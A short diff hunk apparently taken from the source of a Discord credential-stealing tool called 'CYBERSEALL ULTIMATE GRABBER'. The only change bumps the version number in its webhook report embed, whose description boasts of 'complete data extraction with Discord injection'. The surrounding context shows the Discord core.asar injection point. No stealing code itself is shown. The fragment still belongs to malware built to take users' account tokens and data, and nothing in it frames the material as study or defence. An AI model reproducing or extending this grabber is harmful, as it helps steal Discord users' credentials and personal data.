@@ -2045,7 +2045,7 @@ module.exports = require('./core.asar');
             
             embed = {
                 "embeds": [{
-                    "title": "CYBERSEALL ULTIMATE GRABBER v6.0",
+                    "title": "CYBERSEALL ULTIMATE GRABBER v6.1",
                     "description": "**COMPLETE DATA EXTRACTION WITH DISCORD INJECTION**",
                     "color": 0xff0000,
                     "fields": embed_fields,
